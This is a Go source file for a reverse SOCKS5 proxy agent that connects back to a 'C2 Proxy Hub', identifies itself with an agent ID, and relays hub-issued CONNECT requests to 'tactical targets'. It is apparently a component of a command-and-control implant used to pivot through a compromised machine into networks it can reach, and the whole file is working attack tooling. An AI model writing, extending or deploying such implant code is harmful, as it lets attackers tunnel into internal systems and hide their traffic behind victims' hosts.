package proxy

import (
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)


// ProxyInstance represents an active SOCKS5 session
type ProxyInstance struct {
	ServerConn net.Conn
	Active     bool
	mu         sync.Mutex
}

// StartReverseSocks connects back to the C2 and relays SOCKS5 traffic
func StartReverseSocks(c2Addr string, agentID string) error {
	log.Printf("[PROXY] Connecting to C2 Proxy Hub at %s...\n", c2Addr)
	
	conn, err := net.Dial("tcp", c2Addr)
	if err != nil {
		return fmt.Errorf("failed to connect to C2 proxy: %w", err)
	}

	// Tactical Handshake: Send Agent ID so the hub knows who we are
	fmt.Fprintf(conn, "AGENT_ID:%s\n", agentID)

	go handleSocksRelay(conn)
	return nil
}

func handleSocksRelay(c2Conn net.Conn) {
	defer c2Conn.Close()
	
	for {
		// 1. Receive SOCKS5 Request from Hub
		// [VER][CMD][RSV][ATYP][ADDR][PORT]
		header := make([]byte, 4)
		if _, err := io.ReadFull(c2Conn, header); err != nil {
			return
		}

		if header[0] != 0x05 || header[1] != 0x01 { // Only support CONNECT
			return
		}

		// 2. Parse Address
		var addr string
		atyp := header[3]
		switch atyp {
		case 0x01: // IPv4
			ip := make([]byte, 4)
			io.ReadFull(c2Conn, ip)
			addr = net.IP(ip).String()
		case 0x03: // Domain
			lenBuf := make([]byte, 1)
			io.ReadFull(c2Conn, lenBuf)
			domain := make([]byte, int(lenBuf[0]))
			io.ReadFull(c2Conn, domain)
			addr = string(domain)
		}

		portBuf := make([]byte, 2)
		io.ReadFull(c2Conn, portBuf)
		port := int(portBuf[0])<<8 | int(portBuf[1])

		targetAddr := net.JoinHostPort(addr, fmt.Sprintf("%d", port))

		log.Printf("[PROXY] Dialing tactical target: %s\n", targetAddr)

		// 3. Dial Target
		targetConn, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
		if err != nil {
			log.Printf("[PROXY] Target unreachable: %v\n", err)
			c2Conn.Write([]byte{0x05, 0x03, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			continue
		}

		// 4. Success Response
		c2Conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

		// 5. Relay
		log.Printf("[PROXY] Tunneling stream for %s\n", targetAddr)
		relay(c2Conn, targetConn)
		targetConn.Close()
	}
}


// Relays data between two connections
func relay(left, right net.Conn) {
	var wg sync.WaitGroup
	wg.Add(2)
	
	go func() {
		defer wg.Done()
		io.Copy(left, right)
		left.(*net.TCPConn).CloseWrite()
	}()
	
	go func() {
		defer wg.Done()
		io.Copy(right, left)
		right.(*net.TCPConn).CloseWrite()
	}()
	
	wg.Wait()
}
